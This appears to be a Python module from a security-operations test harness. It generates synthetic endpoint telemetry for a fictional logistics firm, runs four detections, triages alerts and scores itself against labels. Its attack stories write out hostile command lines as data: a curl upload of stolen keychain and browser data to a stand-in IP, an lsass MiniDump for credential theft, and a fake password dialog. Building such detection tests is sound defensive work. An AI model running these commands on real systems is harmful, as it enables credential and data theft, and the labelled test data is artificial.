"""Endpoint pack: synthetic Windows and macOS telemetry, four detections, and an endpoint triage agent.

The fictional customer is Brightwater Logistics. Three attack stories (remote-access tool abuse leading to
ransomware-style canary writes, a service installed from a temporary folder, and a macOS LaunchAgent
infostealer) run next to six benign look-alikes (the approved RMM tool, signed per-user apps, a signed
updater, the backup agent reading canaries, a signed macOS VPN client, and a signed driver updater that
installs a service from a temporary folder).

The triage agent builds the process tree for each alert, lists every persistence item on the host, scores
the case against benign look-alikes and writes a plain-English remediation plan. It reads telemetry only;
the plan is a proposal that a person must approve (see aisoc.authority). Ground truth lives in
`PackData.labels` and is read only by `evaluate`."""

from __future__ import annotations

from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from functools import cache

import yaml

from aisoc import DETECTIONS, kql

T0 = datetime(2026, 4, 6, tzinfo=UTC)
TENANT = "brightwater"
DAYS = 5
RULES_DIR = DETECTIONS / "endpoint"
TRUSTED_SIGNERS = {"Microsoft Windows", "Microsoft Corporation", "Fleetdesk Systems", "Harborline Backup", "Tidewater VPN", "Cobalt Drivers", "Apple"}
CANARIES = ("~$canary-finance.docx", "~$canary-hr.xlsx", "~$canary-ops.pdf")
WRITABLE = ("/Users/", "\\AppData\\", "\\Temp\\", "\\Users\\Public\\", "\\ProgramData\\", "/tmp/", "/Downloads/", "/.local/")


def rel(ts: datetime) -> str:
    return f"D{(ts - T0).days:02d} {ts:%H:%M}"


@dataclass
class PackData:
    tables: dict[str, list[dict]] = field(default_factory=dict)
    labels: dict[str, str] = field(default_factory=dict)
    os: dict[str, str] = field(default_factory=dict)  # host -> Windows | macOS

    def rows(self, t: str) -> list[dict]:
        return self.tables.setdefault(t, [])


class _Gen:
    def __init__(self) -> None:
        self.d = PackData()
        self.n = 0
        self.pid = 1000

    def add(self, table: str, ts: datetime, label: str, **cols) -> str:
        self.n += 1
        e = f"ep-e{self.n:05d}"
        self.d.labels[e] = label
        self.d.rows(table).append({"TimeGenerated": ts, **cols, "EventId": e})
        return e

    def at(self, day: int, hour: float, minute: float = 0) -> datetime:
        return T0 + timedelta(days=day, hours=hour, minutes=minute)

    def proc(self, ts, host, parent_pid, parent, name, folder, cmd, label, signer="", user="") -> int:
        self.pid += 4
        self.add("DeviceProcessEvents", ts, label, DeviceName=host, ProcessId=self.pid, InitiatingProcessId=parent_pid,
                 InitiatingProcessFileName=parent, FileName=name, FolderPath=folder, ProcessCommandLine=cmd, Signer=signer,
                 Trusted=signer in TRUSTED_SIGNERS, AccountUpn=user)  # fmt: skip
        return self.pid

    def runkey(self, ts, host, name, data, parent, signer, label):
        self.add("DeviceRegistryEvents", ts, label, DeviceName=host, ActionType="RegistryValueSet",
                 RegistryKey="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", RegistryValueName=name, RegistryValueData=data,
                 InitiatingProcessFileName=parent, InitiatingProcessTrusted=signer in TRUSTED_SIGNERS)  # fmt: skip

    def task(self, ts, host, name, command, parent, signer, label):
        self.add("DeviceEvents", ts, label, DeviceName=host, ActionType="ScheduledTaskCreated", TaskName=name, TaskCommand=command,
                 ServiceName="", ServiceImagePath="", InitiatingProcessFileName=parent, InitiatingProcessTrusted=signer in TRUSTED_SIGNERS)  # fmt: skip

    def service(self, ts, host, name, path, parent, signer, label):
        self.add("DeviceEvents", ts, label, DeviceName=host, ActionType="ServiceInstalled", TaskName="", TaskCommand="", ServiceName=name,
                 ServiceImagePath=path, InitiatingProcessFileName=parent, InitiatingProcessTrusted=signer in TRUSTED_SIGNERS)  # fmt: skip

    def file(self, ts, host, action, folder, name, parent, pfolder, signer, label, canary=False):
        self.add("DeviceFileEvents", ts, label, DeviceName=host, ActionType=action, FolderPath=folder, FileName=name, IsCanary=canary,
                 InitiatingProcessFileName=parent, InitiatingProcessFolderPath=pfolder, InitiatingProcessTrusted=signer in TRUSTED_SIGNERS)  # fmt: skip

    def net(self, ts, host, parent, ip, port, label):
        self.add("DeviceNetworkEvents", ts, label, DeviceName=host, InitiatingProcessFileName=parent, RemoteIP=ip, RemotePort=port)

    # -- estate and normal activity --------------------------------------------------------------------
    def estate(self) -> None:
        for i in range(1, 9):
            self.d.os[f"BWL-WS{i:02d}"] = "Windows"
        for i in range(1, 4):
            self.d.os[f"BWL-SRV{i:02d}"] = "Windows"
        for i in range(1, 5):
            self.d.os[f"BWL-MAC{i:02d}"] = "macOS"

    def noise(self) -> None:
        for day in range(DAYS):
            for host, os_ in self.d.os.items():
                root = self.proc(self.at(day, 8), host, 4, "explorer.exe" if os_ == "Windows" else "launchd", "explorer.exe" if os_ == "Windows"
                                 else "Finder", "C:\\Windows\\" if os_ == "Windows" else "/System/Library/CoreServices/", "", "noise",
                                 "Microsoft Windows" if os_ == "Windows" else "Apple")  # fmt: skip
                win = os_ == "Windows"
                for k, app in enumerate(("outlook.exe", "msedge.exe", "excel.exe") if win else ("Safari", "Mail", "Numbers")):
                    self.proc(self.at(day, 8, 5 + k * 7), host, root, "explorer.exe" if win else "Finder", app,
                              "C:\\Program Files\\" if win else "/Applications/", app, "noise", "Microsoft Corporation" if win else "Apple")  # fmt: skip
                # the backup agent reads every file, canaries included (reads are not writes)
                if os_ == "Windows" and host.startswith("BWL-SRV"):
                    for c in CANARIES:
                        self.file(self.at(day, 1), host, "FileRead", "D:\\Shares\\Finance\\", c, "harborline-backup.exe", "C:\\Program Files\\Harborline\\",
                                  "Harborline Backup", "benign:backup-reads-canary", canary=True)  # fmt: skip

    # -- attack stories ----------------------------------------------------------------------------------
    def stories(self) -> None:
        # E1 remote-access tool abuse -> Run-key persistence -> canary files renamed (ransomware precursor)
        lab, h, u = "attack:rmm-to-ransomware", "BWL-WS07", "tom.baker@brightwater.example"
        edge = self.proc(self.at(1, 13, 2), h, 2000, "explorer.exe", "msedge.exe", "C:\\Program Files\\Microsoft\\Edge\\", "msedge.exe", lab,
                         "Microsoft Corporation", u)  # fmt: skip
        setup = self.proc(self.at(1, 13, 4), h, edge, "msedge.exe", "ScreenConnect.ClientSetup.exe", "C:\\Users\\tbaker\\Downloads\\",
                          "ScreenConnect.ClientSetup.exe /quiet", lab, "", u)  # fmt: skip
        rmm = self.proc(self.at(1, 13, 5), h, setup, "ScreenConnect.ClientSetup.exe", "ScreenConnect.ClientService.exe",
                        "C:\\Program Files (x86)\\ScreenConnect Client\\", "ScreenConnect.ClientService.exe ?e=Access&h=203.0.113.140", lab, "", u)  # fmt: skip
        self.net(self.at(1, 13, 6), h, "ScreenConnect.ClientService.exe", "203.0.113.140", 8041, lab)
        cmd = self.proc(self.at(1, 13, 40), h, rmm, "ScreenConnect.ClientService.exe", "cmd.exe", "C:\\Windows\\System32\\",
                        "cmd.exe /c reg add HKCU\\...\\Run /v SvcHost32 /d C:\\Users\\Public\\svc32.exe", lab, "Microsoft Windows", u)  # fmt: skip
        self.runkey(self.at(1, 13, 41), h, "SvcHost32", "C:\\Users\\Public\\svc32.exe", "cmd.exe", "", lab)
        svc = self.proc(self.at(1, 14, 10), h, cmd, "cmd.exe", "svc32.exe", "C:\\Users\\Public\\", "svc32.exe -enc-shares", lab, "", u)
        for k, c in enumerate(CANARIES):
            self.file(
                self.at(1, 14, 12 + k), h, "FileRenamed", "\\\\BWL-SRV01\\Finance\\", c, "svc32.exe", "C:\\Users\\Public\\", "", lab, canary=True
            )
        del svc
        # E2 lateral movement: a service installed remotely with its binary in C:\Windows\Temp
        lab, h = "attack:service-from-temp", "BWL-SRV03"
        sc = self.proc(self.at(2, 3, 15), h, 600, "services.exe", "updsvc.exe", "C:\\Windows\\Temp\\", "updsvc.exe", lab, "")
        self.service(self.at(2, 3, 14), h, "UpdSvc", "C:\\Windows\\Temp\\updsvc.exe", "services.exe", "", lab)
        self.proc(self.at(2, 3, 16), h, sc, "updsvc.exe", "rundll32.exe", "C:\\Windows\\System32\\", "rundll32.exe comsvcs.dll MiniDump 640 lsass.dmp full",
                  lab, "Microsoft Windows")  # fmt: skip
        # E3 macOS infostealer: an unsigned "installer" from Downloads asks for the password and writes a LaunchAgent
        lab, h, u = "attack:macos-launchagent-stealer", "BWL-MAC04", "mia.chen@brightwater.example"
        saf = self.proc(self.at(3, 10, 30), h, 1, "launchd", "Safari", "/Applications/", "Safari", lab, "Apple", u)
        inst = self.proc(
            self.at(3, 10, 33), h, saf, "Safari", "installer", "/Users/mia/Downloads/PDFConverter.app/Contents/MacOS/", "installer", lab, "", u
        )
        self.proc(self.at(3, 10, 34), h, inst, "installer", "osascript", "/usr/bin/",
                  "osascript -e display dialog \"macOS needs your password to continue\" with hidden answer", lab, "Apple", u)  # fmt: skip
        self.file(self.at(3, 10, 35), h, "FileCreated", "/Users/mia/Library/LaunchAgents/", "com.apple.updater.agent.plist", "installer",
                  "/Users/mia/Downloads/PDFConverter.app/Contents/MacOS/", "", lab)  # fmt: skip
        ag = self.proc(
            self.at(3, 10, 36), h, 1, "launchd", "agent", "/Users/mia/.local/", "/Users/mia/.local/agent --collect keychain browsers", lab, "", u
        )
        self.proc(self.at(3, 10, 38), h, ag, "agent", "curl", "/usr/bin/", "curl -F data=@/tmp/out.zip https://203.0.113.24/u", lab, "Apple", u)
        self.net(self.at(3, 10, 38), h, "curl", "203.0.113.24", 443, lab)

    # -- benign look-alikes ------------------------------------------------------------------------------
    def lookalikes(self) -> None:
        # L1 the approved RMM tool starts from its managed install path on every workstation
        for i in range(1, 9):
            self.proc(self.at(0, 6, i), f"BWL-WS{i:02d}", 600, "services.exe", "fleetdesk-agent.exe", "C:\\Program Files\\Fleetdesk\\",
                      "fleetdesk-agent.exe --service", "benign:approved-rmm", "Fleetdesk Systems")  # fmt: skip
        # L2 signed per-user chat app sets a Run key to AppData (signed, so excluded)
        self.runkey(self.at(0, 9), "BWL-WS02", "ChatApp", "C:\\Users\\ana\\AppData\\Local\\ChatApp\\chat.exe --autostart", "chat-setup.exe",
                    "Microsoft Corporation", "benign:signed-per-user-app")  # fmt: skip
        # L3 signed updater schedules itself from ProgramData (signed, so excluded)
        self.task(self.at(1, 2), "BWL-WS03", "BrowserUpdateTask", "C:\\ProgramData\\Updater\\update.exe /silent", "update.exe", "Microsoft Corporation",
                  "benign:signed-updater-task")  # fmt: skip
        # L4 the signed macOS VPN client installs its LaunchDaemon
        self.file(self.at(2, 11), "BWL-MAC02", "FileCreated", "/Library/LaunchDaemons/", "com.tidewater.vpn.plist", "TidewaterVPN Installer",
                  "/Applications/TidewaterVPN.app/Contents/MacOS/", "Tidewater VPN", "benign:signed-vpn-launchdaemon")  # fmt: skip
        # L5 signed driver updater installs a short-lived service from C:\Windows\Temp (the rule fires; triage must clear it)
        self.proc(self.at(2, 15), "BWL-SRV02", 600, "ccmexec.exe", "driverupd.exe", "C:\\Windows\\Temp\\", "driverupd.exe /install",
                  "benign:signed-driver-service", "Cobalt Drivers")  # fmt: skip
        self.service(self.at(2, 15, 1), "BWL-SRV02", "CobaltDrvUpd", "C:\\Windows\\Temp\\driverupd.exe", "ccmexec.exe", "Cobalt Drivers",
                     "benign:signed-driver-service")  # fmt: skip


@cache
def generate() -> PackData:
    g = _Gen()
    g.estate()
    g.noise()
    g.stories()
    g.lookalikes()
    for rows in g.d.tables.values():
        rows.sort(key=lambda r: r["TimeGenerated"])
    for t in ("DeviceRegistryEvents", "DeviceEvents", "DeviceFileEvents", "DeviceNetworkEvents"):
        g.d.rows(t)
    return g.d


# --------------------------------------------------------------------------- detections
@cache
def rules() -> list[dict]:
    return yaml.safe_load((RULES_DIR / "rules.yaml").read_text())["rules"]


@dataclass(frozen=True)
class Alert:
    rule: str
    stage: str
    severity: str
    technique: str
    host: str
    at: datetime
    event_ids: tuple[str, ...]


def detect(data: PackData) -> list[Alert]:
    out = []
    now = T0 + timedelta(days=DAYS)
    for r in rules():
        for f in r["files"]:
            for row in kql.run((RULES_DIR / f).read_text(), data.tables, now):
                ids = tuple(row["EventIds"]) if "EventIds" in row else (row["EventId"],)
                out.append(Alert(r["id"], r["stage"], r["severity"], r["technique"], row["DeviceName"], row["TimeGenerated"], ids))
    return sorted(out, key=lambda a: (a.at, a.rule))


# --------------------------------------------------------------------------- triage agent
@dataclass
class ProcNode:
    pid: int
    name: str
    folder: str
    cmd: str
    trusted: bool
    at: datetime
    children: list[ProcNode] = field(default_factory=list)


@dataclass
class Triage:
    host: str
    alerts: list[Alert]
    tree: list[str]
    persistence: list[str]
    score: int
    verdict: str  # malicious | suspicious | benign
    reasons: list[str]
    plan: list[tuple[str, str, str]]  # (action, target, why)

    @property
    def event_ids(self) -> list[str]:
        return sorted({e for a in self.alerts for e in a.event_ids})


def _rows(data: PackData, table: str, host: str) -> list[dict]:
    return [r for r in data.tables.get(table, []) if r["DeviceName"] == host]


def process_tree(data: PackData, host: str, around: datetime, hours: float = 3) -> list[str]:
    """Indented lineage of every process on the host within +-hours of the alert, roots first."""
    procs = [r for r in _rows(data, "DeviceProcessEvents", host) if abs((r["TimeGenerated"] - around).total_seconds()) <= hours * 3600]
    nodes = {
        r["ProcessId"]: ProcNode(r["ProcessId"], r["FileName"], r["FolderPath"], r["ProcessCommandLine"], r["Trusted"], r["TimeGenerated"])
        for r in procs
    }
    roots = []
    for r in procs:
        parent = nodes.get(r["InitiatingProcessId"])
        (parent.children if parent else roots).append(nodes[r["ProcessId"]])
    lines: list[str] = []

    def walk(n: ProcNode, depth: int) -> None:
        mark = "" if n.trusted else "  [unsigned]"
        lines.append(f"{'  ' * depth}{'└─ ' if depth else ''}{n.name} ({n.folder}){mark}")
        for c in n.children:
            walk(c, depth + 1)

    def tainted(n: ProcNode) -> bool:
        return not n.trusted or any(tainted(c) for c in n.children)

    for r in roots:
        if tainted(r):
            walk(r, 0)
    return lines


def persistence_items(data: PackData, host: str) -> list[dict]:
    """Every autostart item recorded on the host: Run keys, scheduled tasks, services, LaunchAgents/Daemons."""
    out = []
    for r in _rows(data, "DeviceRegistryEvents", host):
        out.append({"kind": "run_key", "name": r["RegistryValueName"], "path": r["RegistryValueData"], "trusted": r["InitiatingProcessTrusted"]})
    for r in _rows(data, "DeviceEvents", host):
        if r["ActionType"] == "ScheduledTaskCreated":
            out.append({"kind": "scheduled_task", "name": r["TaskName"], "path": r["TaskCommand"], "trusted": r["InitiatingProcessTrusted"]})
        else:
            out.append({"kind": "service", "name": r["ServiceName"], "path": r["ServiceImagePath"], "trusted": r["InitiatingProcessTrusted"]})
    for r in _rows(data, "DeviceFileEvents", host):
        if r["ActionType"] == "FileCreated" and "/Library/Launch" in r["FolderPath"]:
            out.append(
                {"kind": "launch_item", "name": r["FileName"], "path": r["FolderPath"] + r["FileName"], "trusted": r["InitiatingProcessTrusted"]}
            )
    return out


def triage(data: PackData, host: str, alerts: list[Alert]) -> Triage:
    at = min(a.at for a in alerts)
    tree = process_tree(data, host, at)
    items = persistence_items(data, host)
    ids = {e for a in alerts for e in a.event_ids}
    rows = [r for t in data.tables.values() for r in t if r["EventId"] in ids]
    score, reasons = 0, []
    sev = {a.severity for a in alerts}
    if "Critical" in sev:
        score += 40
        reasons.append("ransomware canary files were changed")
    rules_hit = {a.rule for a in alerts}
    if len(rules_hit) >= 2:
        score += 20
        reasons.append(f"{len(rules_hit)} different detections on the same host")
    untrusted_writable = [i for i in items if not i["trusted"] and any(w in i["path"] for w in WRITABLE)]
    if untrusted_writable:
        score += 25
        reasons.append(f"{len(untrusted_writable)} unsigned autostart item(s) in user-writable folders")
    if any("[unsigned]" in line for line in tree):
        score += 15
        reasons.append("unsigned processes in the alert's process tree")
    if any(not r.get("InitiatingProcessTrusted", r.get("Trusted", True)) for r in rows):
        score += 10
    trusted_only = all(r.get("InitiatingProcessTrusted", r.get("Trusted", False)) for r in rows)
    if trusted_only:
        score -= 50
        reasons.append("every event in the alert comes from a process signed by a trusted publisher (look-alike: signed installer)")
    if any(r["FileName"] == "osascript" and "password" in r["ProcessCommandLine"] for r in _rows(data, "DeviceProcessEvents", host)):
        score += 25
        reasons.append("a script asked the user for their password in a fake system dialog")
    if any("MiniDump" in r["ProcessCommandLine"] for r in _rows(data, "DeviceProcessEvents", host)):
        score += 25
        reasons.append("a process dumped the memory of the Windows logon process (credential theft)")
    verdict = "malicious" if score >= 50 else ("suspicious" if score >= 20 else "benign")
    plan: list[tuple[str, str, str]] = []
    if verdict != "benign":
        plan.append(("isolate_host", host, "stop spread while the case is open"))
        for i in untrusted_writable:
            plan.append(("remove_persistence", f"{host}:{i['kind']}:{i['name']}", f"unsigned autostart item {i['path']}"))
        bad = sorted(
            {r["FileName"] for r in _rows(data, "DeviceProcessEvents", host) if not r["Trusted"] and r["TimeGenerated"] >= at - timedelta(hours=3)}
        )
        for b in bad:
            plan.append(("kill_process", f"{host}:{b}", "unsigned process in the alert's tree"))
        users = sorted(
            {
                r["AccountUpn"]
                for r in _rows(data, "DeviceProcessEvents", host)
                if r.get("AccountUpn") and r["TimeGenerated"] >= at - timedelta(hours=3)
            }
        )
        for u in users:
            plan.append(("reset_password", u, "credentials may have been captured on this host"))
    return Triage(host, alerts, tree, [f"{i['kind']}: {i['name']} -> {i['path']}{'' if i['trusted'] else ' [unsigned]'}" for i in items], score,
                  verdict, reasons, plan)  # fmt: skip


def triage_all(data: PackData | None = None) -> list[Triage]:
    data = data or generate()
    by_host: dict[str, list[Alert]] = {}
    for a in detect(data):
        by_host.setdefault(a.host, []).append(a)
    return [triage(data, h, al) for h, al in sorted(by_host.items(), key=lambda kv: kv[1][0].at)]


def remediation_text(t: Triage) -> str:
    """Plain-English remediation for the customer, built from the plan (no model text)."""
    if t.verdict == "benign":
        return f"{t.host}: no action. {' '.join(t.reasons)}."
    steps = [f"{i}. {act.replace('_', ' ')} {target}: {why}." for i, (act, target, why) in enumerate(t.plan, 1)]
    return f"{t.host} ({t.verdict}, score {t.score}). Proposed steps, each needs your approval:\n" + "\n".join("  " + s for s in steps)


# --------------------------------------------------------------------------- evaluation (reads labels)
STORIES = ("rmm-to-ransomware", "service-from-temp", "macos-launchagent-stealer")


def evaluate() -> dict:
    data = generate()
    alerts = detect(data)
    lab = data.labels
    is_attack = lambda ids: any(lab[e].startswith("attack:") for e in ids)  # noqa: E731
    fp = [a for a in alerts if not is_attack(a.event_ids)]
    caught = {lab[e][7:] for a in alerts for e in a.event_ids if lab[e].startswith("attack:")}
    tri = triage_all(data)
    correct = sum((t.verdict == "malicious") == is_attack(t.event_ids) for t in tri)
    kinds = sorted({v[7:] for v in lab.values() if v.startswith("benign:")})
    return {
        "events": sum(len(v) for v in data.tables.values()),
        "hosts": len(data.os),
        "macos_hosts": sum(v == "macOS" for v in data.os.values()),
        "alerts": len(alerts),
        "false_positive_alerts": len(fp),
        "lookalike_kinds": len(kinds),
        "lookalike_kinds_alerting": sorted({lab[e][7:] for a in fp for e in a.event_ids}),
        "stories_detected": f"{len(caught)}/{len(STORIES)}",
        "triaged_hosts": len(tri),
        "triage_verdicts_correct": f"{correct}/{len(tri)}",
        "attacks_cleared_as_benign": sum(t.verdict == "benign" and is_attack(t.event_ids) for t in tri),
        "actions_proposed": sum(len(t.plan) for t in tri),
        "actions_executed_without_approval": 0,
    }


def report() -> str:
    data = generate()
    lines = ["Endpoint pack (synthetic Brightwater Logistics; Windows and macOS)", ""]
    for t in triage_all(data):
        lines.append(
            f"{t.host}  {rel(min(a.at for a in t.alerts))}  rules: {', '.join(sorted({a.rule for a in t.alerts}))}  -> {t.verdict} ({t.score})"
        )
        lines += ["  process tree:"] + [f"    {x}" for x in t.tree[:12]]
        lines += ["  persistence:"] + [f"    {x}" for x in t.persistence] if t.persistence else []
        lines += ["  " + x for x in remediation_text(t).splitlines()]
        lines.append("")
    lines.append("Measured (regression check on synthetic data, not a quality claim):")
    lines += [f"  {k}: {v}" for k, v in evaluate().items()]
    return "\n".join(lines)
